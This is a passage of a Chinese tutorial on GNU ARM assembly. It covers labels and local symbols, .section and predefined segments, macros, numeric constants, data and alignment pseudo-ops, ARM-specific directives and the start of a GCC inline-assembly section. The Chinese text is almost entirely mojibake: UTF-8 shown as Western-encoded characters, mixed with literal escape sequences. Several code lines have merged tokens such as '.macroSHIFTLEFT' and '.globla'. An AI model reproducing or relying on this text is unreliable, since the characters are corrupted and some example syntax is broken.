ä¸Šï¼ˆæˆ–å‡å»ï¼‰ä¸€ä¸ªæ•°å­—å¸¸é‡ï¼Œå¸¸ç”¨äºè¡¨ç¤ºè·³è½¬æŒ‡ä»¤**â€bâ€**ç­‰çš„ç›®æ ‡åœ°å€ï¼Œæˆ–è€…ä»£ç æ®µä¸­æ‰€åµŒå…¥çš„å°‘é‡æ•°æ®ã€‚\n\u003c2\u003e åŸºäºå¯„å­˜å™¨çš„æ ‡å·ã€‚åŸºäºå¯„å­˜å™¨çš„æ ‡å·å¸¸ç”¨MAPå’ŒFIELDæ¥å®šä¹‰ï¼Œä¹Ÿå¯ä»¥ç”¨EQUæ¥å®šä¹‰ã€‚è¿™ç§æ ‡å·åœ¨æ±‡ç¼–æ—¶å°†è¢«å¤„ç†æˆå¯„å­˜å™¨çš„å€¼åŠ ä¸Šï¼ˆæˆ–å‡å»ï¼‰ä¸€ä¸ªæ•°å­—å¸¸é‡ï¼Œå¸¸ç”¨äºè®¿é—®æ•°æ®æ®µä¸­çš„æ•°æ®ã€‚\n\u003c3\u003e ç»å¯¹åœ°å€ã€‚ç»å¯¹åœ°å€æ˜¯ä¸€ä¸ª32ä½æ•°æ®ã€‚å®ƒå¯ä»¥å¯»å€çš„èŒƒå›´ä¸º[0ï¼Œ232-1]å³å¯ä»¥ç›´æ¥å¯»å€æ•´ä¸ªå†…å­˜ç©ºé—´ã€‚\n**ç‰¹åˆ«è¯´æ˜ï¼š**å±€éƒ¨æ ‡å·Symbol\nâ€‹ å±€éƒ¨æ ‡å·ä¸»è¦åœ¨å±€éƒ¨èŒƒå›´å†…ä½¿ç”¨ï¼Œè€Œä¸”å±€éƒ¨æ ‡å·å¯ä»¥é‡å¤å‡ºç°ã€‚å®ƒç”±ä¸¤éƒ¨ç»„æˆï¼šå¼€å¤´æ˜¯ä¸€ä¸ª0-99ç›´æ¥çš„æ•°å­—ï¼Œåé¢ç´§æ¥ä¸€ä¸ªé€šå¸¸è¡¨ç¤ºè¯¥å±€éƒ¨å˜é‡ä½œç”¨èŒƒå›´çš„ç¬¦å·ã€‚å±€éƒ¨å˜é‡çš„ä½œç”¨èŒƒå›´é€šå¸¸ä¸ºå½“å‰æ®µï¼Œä¹Ÿå¯ä»¥ç”¨ROUTæ¥å®šä¹‰å±€éƒ¨å˜é‡çš„ä½œç”¨èŒƒå›´ã€‚\nâ€‹ å±€éƒ¨å˜é‡å®šä¹‰çš„è¯­æ³•æ ¼å¼ï¼šN{routname}\nl Nï¼šä¸º0~99ä¹‹é—´çš„æ•°å­—ã€‚\nl routnameï¼šå½“å‰å±€éƒ¨èŒƒå›´çš„åç§°ï¼ˆä¸ºç¬¦å·ï¼‰ï¼Œé€šå¸¸ä¸ºè¯¥å˜é‡ä½œç”¨èŒƒå›´çš„åç§°ï¼ˆç”¨ROUTä¼ªæ“ä½œå®šä¹‰çš„ï¼‰ã€‚\nâ€‹ å±€éƒ¨å˜é‡å¼•ç”¨çš„è¯­æ³•æ ¼å¼ï¼š%{F|B}{A|T}N{routname}\nl %ï¼šè¡¨ç¤ºå¼•ç”¨æ“ä½œ\nl Nï¼šä¸ºå±€éƒ¨å˜é‡çš„æ•°å­—å·\nl routnameï¼šä¸ºå½“å‰ä½œç”¨èŒƒå›´çš„åç§°ï¼ˆç”¨ROUTä¼ªæ“ä½œå®šä¹‰çš„ï¼‰\nl Fï¼šæŒ‡ç¤ºç¼–è¯‘å™¨åªå‘å‰æœç´¢\nl Bï¼šæŒ‡ç¤ºç¼–è¯‘å™¨åªå‘åæœç´¢\nl Aï¼šæŒ‡ç¤ºç¼–è¯‘å™¨æœç´¢å®çš„æ‰€æœ‰åµŒå¥—å±‚æ¬¡\nl Tï¼šæŒ‡ç¤ºç¼–è¯‘å™¨æœç´¢å®çš„å½“å‰å±‚æ¬¡\nä¾‹ï¼šä½¿ç”¨å±€éƒ¨ç¬¦å·çš„ä¾‹å­ï¼Œä¸€æ®µå¾ªç¯ç¨‹åº\nsubs r0, r0, #1 @æ¯æ¬¡å¾ªç¯ä½¿r0=r0-1\nbne 1F @è·³è½¬åˆ°1æ ‡å·å»æ‰§è¡Œ\næ³¨æ„ï¼š\nl å¦‚æœFå’ŒBéƒ½æ²¡æœ‰æŒ‡å®šï¼Œç¼–è¯‘å™¨å…ˆå‘å‰æœç´¢ï¼Œå†å‘åæœç´¢\nl å¦‚æœAå’ŒTéƒ½æ²¡æœ‰æŒ‡å®šï¼Œç¼–è¯‘å™¨æœç´¢æ‰€æœ‰ä»å½“å‰å±‚æ¬¡åˆ°å®çš„æœ€é«˜å±‚æ¬¡ï¼Œæ¯”å½“å‰å±‚æ¬¡ä½çš„å±‚æ¬¡ä¸å†æœç´¢ã€‚\nl å¦‚æœæŒ‡å®šäº†routnameï¼Œç¼–è¯‘å™¨å‘å‰æœç´¢æœ€è¿‘çš„ROUTä¼ªæ“ä½œï¼Œè‹¥routnameä¸è¯¥ROUTä¼ªæ“ä½œå®šä¹‰çš„åç§°ä¸åŒ¹é…ï¼Œç¼–è¯‘å™¨æŠ¥å‘Šé”™è¯¯ï¼Œæ±‡ç¼–å¤±è´¥ã€‚\n1.3. GNUæ±‡ç¼–ç¨‹åºä¸­çš„åˆ†æ®µ \u003c1\u003e .sectionä¼ªæ“ä½œ\n.section \u003csection_name\u003e {,â€â€}\nStartsa new code or data section. Sections in GNU are called .text, a code section, .data, an initializeddata section, and .bss, an uninitialized data section.\nThesesections have default flags, and the linker understands the default names(similardirective to the armasm directive AREA).The following are allowable .section flags for ELF format files:\n Meaning\na allowable section\nw writable section\nx executable section\nä¸­æ–‡è§£é‡Šï¼š\nç”¨æˆ·å¯ä»¥é€šè¿‡.sectionä¼ªæ“ä½œæ¥è‡ªå®šä¹‰ä¸€ä¸ªæ®µ,æ ¼å¼å¦‚ä¸‹ï¼š\n.section section_name [,\"flags\"[, %type[,flag_specific_arguments]]]\næ¯ä¸€ä¸ªæ®µä»¥æ®µåä¸ºå¼€å§‹, ä»¥ä¸‹ä¸€ä¸ªæ®µåæˆ–è€…æ–‡ä»¶ç»“å°¾ä¸ºç»“æŸã€‚è¿™äº›æ®µéƒ½æœ‰ç¼ºçœçš„æ ‡å¿—ï¼ˆflagsï¼‰ï¼Œè¿æ¥å™¨å¯ä»¥è¯†åˆ«è¿™äº›æ ‡å¿—ã€‚(ä¸arm asmä¸­çš„AREAç›¸åŒ)ã€‚ä¸‹é¢æ˜¯ELFæ ¼å¼å…è®¸çš„æ®µæ ‡å¿—flagsï¼š\n\u003cæ ‡å¿—\u003e å«ä¹‰\na å…è®¸æ®µ\nw å¯å†™æ®µ\nx æ‰§è¡Œæ®µ\nä¾‹ï¼šå®šä¹‰ä¸€ä¸ªâ€œæ®µâ€\n.section.mysection @è‡ªå®šä¹‰æ•°æ®æ®µï¼Œæ®µåä¸º â€œ.mysectionâ€\n.align 2\nstrtemp:\nâ€‹ .ascii \"Temp string \\n\\0\" @å¯¹è¿™ä¸€å¥çš„ç†è§£ï¼Œæˆ‘è§‰å¾—åº”è¯¥æ˜¯ï¼šå°†\"Temp string \\n\\0\"è¿™ä¸ªå­—ç¬¦ä¸²å­˜å‚¨åœ¨ä»¥æ ‡å·strtempä¸ºèµ·å§‹åœ°å€çš„ä¸€æ®µå†…å­˜ç©ºé—´é‡Œ\n\u003c2\u003e æ±‡ç¼–ç³»ç»Ÿé¢„å®šä¹‰çš„æ®µå\nl .text @ä»£ç æ®µ\nl .data @åˆå§‹åŒ–æ•°æ®æ®µ.data Read-write initialized long data.\nl .bss @æœªåˆå§‹åŒ–æ•°æ®æ®µ\nl .sdata @ .sdata Read-write initialized short data.\nl .sbss @\næ³¨æ„ï¼šæºç¨‹åºä¸­.bssæ®µåº”è¯¥åœ¨.textæ®µä¹‹å‰ã€‚\n1.4. GNUæ±‡ç¼–è¯­è¨€å®šä¹‰å…¥å£ç‚¹ æ±‡ç¼–ç¨‹åºçš„ç¼ºçœå…¥å£æ˜¯**_start**æ ‡å·ï¼Œ**ç”¨æˆ·ä¹Ÿå¯ä»¥åœ¨è¿æ¥è„šæœ¬æ–‡ä»¶ä¸­ç”¨ENTRYæ ‡å¿—æŒ‡æ˜å…¶å®ƒå…¥å£ç‚¹**ã€‚\nä¾‹ï¼šå®šä¹‰å…¥å£ç‚¹\n.section .data\n\u003c initialized data here\u003e\n.section .bss\n\u003c uninitialized data here\u003e\n.section .text\n.globl _start\n_start:\n1.5. GNUæ±‡ç¼–ç¨‹åºä¸­çš„å®å®šä¹‰ æ ¼å¼å¦‚ä¸‹ï¼š\n.macro å®åå‚æ•°ååˆ—è¡¨ @ä¼ªæŒ‡ä»¤.macroå®šä¹‰ä¸€ä¸ªå®\nå®ä½“\n.endm @.endmè¡¨ç¤ºå®ç»“æŸ\nâ€‹ å¦‚æœå®ä½¿ç”¨å‚æ•°,é‚£ä¹ˆåœ¨å®ä½“ä¸­ä½¿ç”¨è¯¥å‚æ•°æ—¶æ·»åŠ å‰ç¼€**â€œ\\â€**ã€‚å®å®šä¹‰æ—¶çš„å‚æ•°è¿˜å¯ä»¥ä½¿ç”¨é»˜è®¤å€¼ã€‚å¯ä»¥ä½¿ç”¨.exitmä¼ªæŒ‡ä»¤æ¥é€€å‡ºå®ã€‚\nä¾‹ï¼šå®å®šä¹‰\n.macroSHIFTLEFT a, b\n.if \\b\u003c 0\nMOV \\a,\\a, ASR #-\\b\n.exitm\n.endif\nMOV \\a,\\a, LSL #\\b\n.endm\n1.6. GNUæ±‡ç¼–ç¨‹åºä¸­çš„å¸¸æ•° \u003c1\u003e åè¿›åˆ¶æ•°ä»¥é0æ•°å­—å¼€å¤´,å¦‚:123å’Œ9876ï¼›\n\u003c2\u003e äºŒè¿›åˆ¶æ•°ä»¥0bå¼€å¤´,å…¶ä¸­å­—æ¯ä¹Ÿå¯ä»¥ä¸ºå¤§å†™ï¼›\n\u003c3\u003e å…«è¿›åˆ¶æ•°ä»¥0å¼€å§‹,å¦‚:0456,0123ï¼›\n\u003c4\u003e åå…­è¿›åˆ¶æ•°ä»¥0xå¼€å¤´,å¦‚:0xabcd,0X123fï¼›\n\u003c5\u003e å­—ç¬¦ä¸²å¸¸é‡éœ€è¦ç”¨å¼•å·æ‹¬èµ·æ¥,ä¸­é—´ä¹Ÿå¯ä»¥ä½¿ç”¨è½¬ä¹‰å­—ç¬¦,å¦‚: â€œYou are welcome!\\nâ€ï¼›\n\u003c6\u003e å½“å‰åœ°å€ä»¥â€œ.â€è¡¨ç¤º,åœ¨GNUæ±‡ç¼–ç¨‹åºä¸­å¯ä»¥ä½¿ç”¨è¿™ä¸ªç¬¦å·ä»£è¡¨å½“å‰æŒ‡ä»¤çš„åœ°å€ï¼›\n\u003c7\u003e è¡¨è¾¾å¼ï¼šåœ¨æ±‡ç¼–ç¨‹åºä¸­çš„è¡¨è¾¾å¼å¯ä»¥ä½¿ç”¨å¸¸æ•°æˆ–è€…æ•°å€¼, â€œ-â€è¡¨ç¤ºå–è´Ÿæ•°, â€œ~â€è¡¨ç¤ºå–è¡¥,â€œ\u003c\u003eâ€è¡¨ç¤ºä¸ç›¸ç­‰,å…¶ä»–çš„ç¬¦å·å¦‚:+ã€-ã€*ã€/ã€%ã€\u003cã€\u003c\u003cã€\u003eã€\u003e\u003eã€|ã€\u0026ã€^ã€!ã€==ã€\u003e=ã€\u003c=ã€\u0026\u0026ã€|| è·ŸCè¯­è¨€ä¸­çš„ç”¨æ³•ç›¸ä¼¼ã€‚\n1.7. GNU ARMæ±‡ç¼–çš„å¸¸ç”¨ä¼ªæ“ä½œ â€‹ åœ¨å‰é¢å·²ç»æåˆ°è¿‡äº†ä¸€äº›ä¸ºæ“ä½œï¼Œè¿˜æœ‰ä¸‹é¢ä¸€äº›ä¸ºæ“ä½œï¼š\nl æ•°æ®å®šä¹‰ä¼ªæ“ä½œï¼š .byteï¼Œ.shortï¼Œ.longï¼Œ.quadï¼Œ.floatï¼Œ.string/.asciz/.asciiï¼Œé‡å¤å®šä¹‰ä¼ªæ“ä½œ.reptï¼Œèµ‹å€¼è¯­å¥.equ/.set ï¼›\nl å‡½æ•°çš„å®šä¹‰ï¼›\nl å¯¹é½æ–¹å¼ä¼ªæ“ä½œ .alignï¼›\nl æºæ–‡ä»¶ç»“æŸä¼ªæ“ä½œ.endï¼›\nl .includeä¼ªæ“ä½œï¼›\nl ifä¼ªæ“ä½œï¼›\nl .global/ .globl ä¼ªæ“ä½œï¼›\nl .typeä¼ªæ“ä½œï¼›\nl åˆ—è¡¨æ§åˆ¶è¯­å¥ï¼›\nåˆ«äºGNU ASæ±‡ç¼–çš„é€šç”¨ä¼ªæ“ä½œ,ä¸‹é¢æ˜¯ARMç‰¹æœ‰çš„ä¼ªæ“ä½œï¼š\n.reg ï¼Œ.unreq ï¼Œ.code ï¼Œ.thumb ï¼Œ.thumb_func ï¼Œ.thumb_setï¼Œ .ltorg ï¼Œ.pool\n\u003c1\u003e æ•°æ®å®šä¹‰ä¼ªæ“ä½œ\nl .byte:å•å­—èŠ‚å®šä¹‰ï¼Œå¦‚ï¼š.byte 1,2,0b01,0x34,072,'s' ï¼›\nl .short:å®šä¹‰åŒå­—èŠ‚æ•°æ®ï¼Œå¦‚:.short 0x1234,60000 ï¼›\nl .long:å®šä¹‰4å­—èŠ‚æ•°æ®ï¼Œå¦‚:.long 0x12345678,23876565\nl .quad:å®šä¹‰8å­—èŠ‚ï¼Œå¦‚:.quad 0x1234567890abcd\nl .floatï¼šå®šä¹‰æµ®ç‚¹æ•°ï¼Œå¦‚ï¼š.float 0f-314159265358979323846264338327\\\nâ€‹ 95028841971.693993751E-40 @ - pi\nl .string/.asciz/.asciiï¼šå®šä¹‰å¤šä¸ªå­—ç¬¦ä¸²ï¼Œå¦‚:\n.string \"abcd\",\"efgh\", \"hello!\"\n.asciz \"qwer\",\"sun\", \"world!\"\n.ascii \"welcome\\0\"\nâ€‹ æ³¨æ„ï¼šasciiä¼ªæ“ä½œå®šä¹‰çš„å­—ç¬¦ä¸²éœ€è¦è‡ªè¡Œæ·»åŠ ç»“å°¾å­—ç¬¦'\\0'ã€‚\nl .rept:é‡å¤å®šä¹‰ä¼ªæ“ä½œ, æ ¼å¼å¦‚ä¸‹ï¼š\n.rept é‡å¤æ¬¡æ•°\næ•°æ®å®šä¹‰\n.endr @ç»“æŸé‡å¤å®šä¹‰\nä¾‹ï¼š\n.rept 3\n.byte 0x23\n.endr\nl .equ/.set: èµ‹å€¼è¯­å¥, æ ¼å¼å¦‚ä¸‹ï¼š\n.equ(.set)å˜é‡åï¼Œè¡¨è¾¾å¼\nä¾‹ï¼š\n.equ abc, 3 @è®©abc=3\n\u003c2\u003e å‡½æ•°çš„å®šä¹‰ä¼ªæ“ä½œ\nl å‡½æ•°çš„å®šä¹‰,æ ¼å¼å¦‚ä¸‹ï¼š\nå‡½æ•°å**:**\nå‡½æ•°ä½“\nè¿”å›è¯­å¥\nâ€‹ ä¸€èˆ¬çš„,**å‡½æ•°å¦‚æœéœ€è¦åœ¨å…¶ä»–æ–‡ä»¶ä¸­è°ƒç”¨, éœ€è¦ç”¨åˆ°.globalä¼ªæ“ä½œå°†å‡½æ•°å£°æ˜ä¸ºå…¨å±€å‡½æ•°ã€‚**ä¸ºäº†ä¸è‡³äºåœ¨å…¶ä»–ç¨‹åºåœ¨è°ƒç”¨æŸä¸ªCå‡½æ•°æ—¶å‘ç”Ÿæ··ä¹±,å¯¹å¯„å­˜å™¨çš„ä½¿ç”¨æˆ‘ä»¬éœ€è¦éµå¾ªAPCSå‡†åˆ™ã€‚å‡½æ•°ç¼–è¯‘å™¨å°†å¤„ç†å‡½æ•°ä»£ç ä¸ºä¸€æ®µ.globalçš„æ±‡ç¼–ç ã€‚\nl å‡½æ•°çš„ç¼–å†™åº”å½“éµå¾ªå¦‚ä¸‹è§„åˆ™ï¼š\na. a1-a4å¯„å­˜å™¨ï¼ˆå‚æ•°ã€ç»“æœæˆ–æš‚å­˜å¯„å­˜å™¨ï¼Œr0åˆ°r3 çš„åŒä¹‰å­—ï¼‰ä»¥åŠæµ®ç‚¹å¯„å­˜å™¨f0-f3(å¦‚æœå­˜åœ¨æµ®ç‚¹åå¤„ç†å™¨)åœ¨å‡½æ•°ä¸­æ˜¯ä¸å¿…ä¿å­˜çš„ï¼›\nb. å¦‚æœå‡½æ•°è¿”å›ä¸€ä¸ªä¸å¤§äºä¸€ä¸ªå­—å¤§å°çš„å€¼ï¼Œåˆ™åœ¨å‡½æ•°ç»“æŸæ—¶åº”è¯¥æŠŠè¿™ä¸ªå€¼é€åˆ° r0 ä¸­ï¼›\nc. å¦‚æœå‡½æ•°è¿”å›ä¸€ä¸ªæµ®ç‚¹æ•°ï¼Œåˆ™åœ¨å‡½æ•°ç»“æŸæ—¶æŠŠå®ƒæ”¾å…¥æµ®ç‚¹å¯„å­˜å™¨f0ä¸­ï¼›\nd. å¦‚æœå‡½æ•°çš„è¿‡ç¨‹æ”¹åŠ¨äº†spï¼ˆå †æ ˆæŒ‡é’ˆï¼Œr13ï¼‰ã€fpï¼ˆæ¡†æ¶æŒ‡é’ˆï¼Œr11ï¼‰ã€slï¼ˆå †æ ˆé™åˆ¶ï¼Œr10ï¼‰ã€lrï¼ˆè¿æ¥å¯„å­˜å™¨ï¼Œr14ï¼‰ã€v1-v8ï¼ˆå˜é‡å¯„å­˜å™¨ï¼Œr4 åˆ° r11ï¼‰å’Œ f4-f7,é‚£ä¹ˆå‡½æ•°ç»“æŸæ—¶è¿™äº›å¯„å­˜å™¨åº”å½“è¢«æ¢å¤ä¸ºåŒ…å«åœ¨è¿›å…¥å‡½æ•°æ—¶å®ƒæ‰€æŒæœ‰çš„å€¼ã€‚\n\u003c3\u003e .align .end .include .incbinä¼ªæ“ä½œ\nl .align:ç”¨æ¥æŒ‡å®šæ•°æ®çš„å¯¹é½æ–¹å¼,æ ¼å¼å¦‚ä¸‹:\nâ€‹ .align [absexpr1, absexpr2]\nâ€‹ ä»¥æŸç§å¯¹é½æ–¹å¼,åœ¨æœªä½¿ç”¨çš„å­˜å‚¨åŒºåŸŸå¡«å……å€¼. ç¬¬ä¸€ä¸ªå€¼è¡¨ç¤ºå¯¹é½æ–¹å¼,4, 8,16æˆ– 32.ç¬¬äºŒä¸ªè¡¨è¾¾å¼å€¼è¡¨ç¤ºå¡«å……çš„å€¼ã€‚\nl .end:è¡¨æ˜æºæ–‡ä»¶çš„ç»“æŸã€‚\nl .include:å¯ä»¥å°†æŒ‡å®šçš„æ–‡ä»¶åœ¨ä½¿ç”¨.include çš„åœ°æ–¹å±•å¼€,ä¸€èˆ¬æ˜¯å¤´æ–‡ä»¶,ä¾‹å¦‚:\nâ€‹ .include â€œmyarmasm.hâ€\nl .incbinä¼ªæ“ä½œå¯ä»¥å°†åŸå°ä¸åŠ¨çš„ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ç¼–è¯‘åˆ°å½“å‰æ–‡ä»¶ä¸­,ä½¿ç”¨æ–¹æ³•å¦‚ä¸‹:\nâ€‹ .incbin\"file\"[,skip[,count]]\nâ€‹ skipè¡¨æ˜æ˜¯ä»æ–‡ä»¶å¼€å§‹è·³è¿‡skipä¸ªå­—èŠ‚å¼€å§‹è¯»å–æ–‡ä»¶,countæ˜¯è¯»å–çš„å­—æ•°.\n\u003c4\u003e ..ifä¼ªæ“ä½œ\nâ€‹ æ ¹æ®ä¸€ä¸ªè¡¨è¾¾å¼çš„å€¼æ¥å†³å®šæ˜¯å¦è¦ç¼–è¯‘ä¸‹é¢çš„ä»£ç , ç”¨.endifä¼ªæ“ä½œæ¥è¡¨ç¤ºæ¡ä»¶åˆ¤æ–­çš„ç»“æŸ,ä¸­é—´å¯ä»¥ä½¿ç”¨.elseæ¥å†³å®š.ifçš„æ¡ä»¶ä¸æ»¡è¶³çš„æƒ…å†µä¸‹åº”è¯¥ç¼–è¯‘å“ªä¸€éƒ¨åˆ†ä»£ç ã€‚\n.ifæœ‰å¤šä¸ªå˜ç§:\n.ifdefsymbol @åˆ¤æ–­symbolæ˜¯å¦å®šä¹‰\n.ifcstring1,string2 @å­—ç¬¦ä¸²string1å’Œstring2æ˜¯å¦ç›¸ç­‰,å­—ç¬¦ä¸²å¯ä»¥ç”¨å•å¼•å·æ‹¬èµ·æ¥\n.ifeqexpression @åˆ¤æ–­expressionçš„å€¼æ˜¯å¦ä¸º0\n.ifeqsstring1,string2 @åˆ¤æ–­string1å’Œstring2æ˜¯å¦ç›¸ç­‰,å­—ç¬¦ä¸²å¿…é¡»ç”¨åŒå¼•å·æ‹¬èµ·æ¥\n.ifgeexpression @åˆ¤æ–­expressionçš„å€¼æ˜¯å¦å¤§äºç­‰äº0\n.ifgtabsolute expression @åˆ¤æ–­expressionçš„å€¼æ˜¯å¦å¤§äº0\n.ifleexpression @åˆ¤æ–­expressionçš„å€¼æ˜¯å¦å°äºç­‰äº0\n.ifltabsolute expression @åˆ¤æ–­expressionçš„å€¼æ˜¯å¦å°äº0\n.ifncstring1,string2 @åˆ¤æ–­string1å’Œstring2æ˜¯å¦ä¸ç›¸ç­‰, å…¶ç”¨æ³•è·Ÿ.ifcæ°å¥½ç›¸åã€‚\n.ifndefsymbol, .ifnotdef symbol @åˆ¤æ–­æ˜¯å¦æ²¡æœ‰å®šä¹‰symbol, è·Ÿ.ifdefæ°å¥½ç›¸å\n.ifneexpression @å¦‚æœexpressionçš„å€¼ä¸æ˜¯0, é‚£ä¹ˆç¼–è¯‘å™¨å°†ç¼–è¯‘ä¸‹é¢çš„ä»£ç \n.ifnesstring1,string2 @å¦‚æœå­—ç¬¦ä¸²string1å’Œstring2ä¸ç›¸ç­‰, é‚£ä¹ˆç¼–è¯‘å™¨å°†ç¼–è¯‘ä¸‹é¢çš„ä»£ç .\n\u003c5\u003e .global .type .title .list\nl .global/ .globl ï¼šç”¨æ¥å®šä¹‰ä¸€ä¸ªå…¨å±€çš„ç¬¦å·ï¼Œæ ¼å¼å¦‚ä¸‹:\nâ€‹ .global symbol æˆ–è€… .globl symbol\nl .typeï¼šç”¨æ¥æŒ‡å®šä¸€ä¸ªç¬¦å·çš„ç±»å‹æ˜¯å‡½æ•°ç±»å‹æˆ–è€…æ˜¯å¯¹è±¡ç±»å‹, å¯¹è±¡ç±»å‹ä¸€èˆ¬æ˜¯æ•°æ®, æ ¼å¼å¦‚ä¸‹:\nâ€‹ .type ç¬¦å·, ç±»å‹æè¿°\nä¾‹ï¼š\n.globla\n.data\n.align4\n.typea, @object\n.sizea, 4\na:\n.long10\nä¾‹ï¼š\n.section.text\n.typeasmfunc, @function\n.globlasmfunc\nasmfunc:\nmov pc,lr\n\u003c6\u003e åˆ—è¡¨æ§åˆ¶è¯­å¥:\n.titleï¼šç”¨æ¥æŒ‡å®šæ±‡ç¼–åˆ—è¡¨çš„æ ‡é¢˜,ä¾‹å¦‚:\n.title â€œmy programâ€\n.listï¼šç”¨æ¥è¾“å‡ºåˆ—è¡¨æ–‡ä»¶.\n\u003c7\u003e ARMç‰¹æœ‰çš„ä¼ªæ“ä½œ\nl .reg: ç”¨æ¥ç»™å¯„å­˜å™¨èµ‹äºˆåˆ«å,æ ¼å¼å¦‚ä¸‹:\nâ€‹ åˆ«å .req å¯„å­˜å™¨å\nl .unreq: ç”¨æ¥å–æ¶ˆä¸€ä¸ªå¯„å­˜å™¨çš„åˆ«å,æ ¼å¼å¦‚ä¸‹:\n.unreq å¯„å­˜å™¨åˆ«å\nâ€‹ æ³¨æ„è¢«å–æ¶ˆçš„åˆ«åå¿…é¡»äº‹å…ˆå®šä¹‰è¿‡,å¦åˆ™ç¼–è¯‘å™¨å°±ä¼šæŠ¥é”™,è¿™ä¸ªä¼ªæ“ä½œä¹Ÿå¯ä»¥ç”¨æ¥å–æ¶ˆç³»ç»Ÿé¢„åˆ¶çš„åˆ«å, ä¾‹å¦‚r0, ä½†å¦‚æœæ²¡æœ‰å¿…è¦çš„è¯ä¸æ¨èé‚£æ ·åšã€‚\nl .codeä¼ªæ“ä½œç”¨æ¥é€‰æ‹©ARMæˆ–è€…ThumbæŒ‡ä»¤é›†,æ ¼å¼å¦‚ä¸‹:\n.code è¡¨è¾¾å¼\nã€€å¦‚æœè¡¨è¾¾å¼çš„å€¼ä¸º16åˆ™è¡¨æ˜ä¸‹é¢çš„æŒ‡ä»¤ä¸ºThumbæŒ‡ä»¤,å¦‚æœè¡¨è¾¾å¼çš„å€¼ä¸º32åˆ™è¡¨æ˜ä¸‹é¢çš„æŒ‡ä»¤ä¸ºARMæŒ‡ä»¤.\nl .thumbä¼ªæ“ä½œç­‰åŒäº.code 16, è¡¨æ˜ä½¿ç”¨ThumbæŒ‡ä»¤, ç±»ä¼¼çš„.armç­‰åŒäº.code 32\nl .force_thumbä¼ªæ“ä½œç”¨æ¥å¼ºåˆ¶ç›®æ ‡å¤„ç†å™¨é€‰æ‹©thumbçš„æŒ‡ä»¤é›†è€Œä¸ç®¡å¤„ç†å™¨æ˜¯å¦æ”¯æŒ\nl .thumb_funcä¼ªæ“ä½œç”¨æ¥æŒ‡æ˜ä¸€ä¸ªå‡½æ•°æ˜¯thumbæŒ‡ä»¤é›†çš„å‡½æ•°\nl .thumb_setä¼ªæ“ä½œçš„ä½œç”¨ç±»ä¼¼äº.set, å¯ä»¥ç”¨æ¥ç»™ä¸€ä¸ªæ ‡å¿—èµ·ä¸€ä¸ªåˆ«å, æ¯”.setåŠŸèƒ½å¢åŠ çš„ä¸€ç‚¹æ˜¯å¯ä»¥æŠŠä¸€ä¸ªæ ‡å¿—æ ‡è®°ä¸ºthumbå‡½æ•°çš„å…¥å£, è¿™ç‚¹åŠŸèƒ½ç­‰åŒäº.thumb_func\nl .ltorgç”¨äºå£°æ˜ä¸€ä¸ªæ•°æ®ç¼“å†²æ± (literal pool)çš„å¼€å§‹,å®ƒå¯ä»¥åˆ†é…å¾ˆå¤§çš„ç©ºé—´ã€‚\nl .poolçš„ä½œç”¨ç­‰åŒ.ltorg\nl .space\u003cnumber_of_bytes\u003e {,\u003cfill_byte\u003e}\nâ€‹ åˆ†é…number_of_byteså­—èŠ‚çš„æ•°æ®ç©ºé—´ï¼Œå¹¶å¡«å……å…¶å€¼ä¸ºfill_byteï¼Œè‹¥æœªæŒ‡å®šè¯¥å€¼ï¼Œç¼ºçœå¡«å……0ã€‚ï¼ˆä¸armasmä¸­çš„SPACEåŠŸèƒ½ç›¸åŒï¼‰\nl .word {,} â€¦æ’å…¥ä¸€ä¸ª32-bitçš„æ•°æ®é˜Ÿåˆ—ã€‚ï¼ˆä¸armasmä¸­çš„DCDåŠŸèƒ½ç›¸åŒï¼‰å¯ä»¥ä½¿ç”¨.wordæŠŠæ ‡è¯†ç¬¦ä½œä¸ºå¸¸é‡ä½¿ç”¨ã€‚\nä¾‹ï¼š\nStart:\nvalueOfStart:\nâ€‹ .word Start\nè¿™æ ·ç¨‹åºçš„å¼€å¤´Startä¾¿è¢«å­˜å…¥äº†å†…å­˜å˜é‡valueOfStartä¸­ã€‚\nl .hword {,} â€¦\næ’å…¥ä¸€ä¸ª16-bitçš„æ•°æ®é˜Ÿåˆ—ã€‚ï¼ˆä¸armasmä¸­çš„DCWç›¸åŒï¼‰\n1.8. GNU ARMæ±‡ç¼–ç‰¹æ®Šå­—ç¬¦å’Œè¯­æ³• \u003c1\u003e ä»£ç è¡Œä¸­çš„æ³¨é‡Šç¬¦å·: â€˜@â€™\n\u003c2\u003e æ•´è¡Œæ³¨é‡Šç¬¦å·: â€˜#â€™\n\u003c3\u003e è¯­å¥åˆ†ç¦»ç¬¦å·: â€˜;â€™\n\u003c4\u003e ç«‹å³æ•°å‰ç¼€: â€˜#â€™ æˆ– â€˜$â€™\n3. ARM GCC å†…åµŒæ±‡ç¼– å¯¹äºåŸºäºARMçš„RISCå¤„ç†å™¨ï¼ŒGNUCç¼–è¯‘å™¨æä¾›äº†åœ¨Cä»£ç ä¸­å†…åµŒæ±‡ç¼–çš„åŠŸèƒ½ã€‚è¿™ç§éå¸¸é…·çš„ç‰¹æ€§æä¾›äº†Cä»£ç æ²¡æœ‰çš„åŠŸèƒ½ï¼Œæ¯”å¦‚æ‰‹åŠ¨ä¼˜åŒ–è½¯ä»¶å…³é”®éƒ¨åˆ†çš„ä»£ç ã€ä½¿ç”¨ç›¸å…³çš„å¤„ç†å™¨æŒ‡ä»¤ã€‚è¿™é‡Œè®¾æƒ³äº†è¯»è€…æ˜¯ç†Ÿç»ƒç¼–å†™ARMæ±‡ç¼–ç¨‹åºè¯»è€…ï¼Œå› ä¸ºè¯¥ç‰‡æ–‡æ¡£ä¸æ˜¯ARMæ±‡ç¼–æ‰‹å†Œã€‚åŒæ ·ä¹Ÿä¸æ˜¯Cè¯­è¨€æ‰‹å†Œã€‚è¿™ç¯‡æ–‡æ¡£å‡è®¾ä½¿ç”¨çš„æ˜¯GCC 4 çš„ç‰ˆæœ¬ï¼Œä½†æ˜¯å¯¹äºæ—©æœŸçš„ç‰ˆæœ¬ä¹Ÿæœ‰æ•ˆã€‚\nGCCasm å£°æ˜\nè®©æˆ‘ä»¬ä»¥ä¸€ä¸ªç®€å•çš„ä¾‹å­å¼€å§‹ã€‚å°±åƒCä¸­çš„å£°æ˜ä¸€æ ·ï¼Œä¸‹é¢çš„å£°æ˜ä»£ç å¯èƒ½å‡ºç°åœ¨ä½ çš„ä»£ç ä¸­ã€‚\n/*NOP ä¾‹å­ 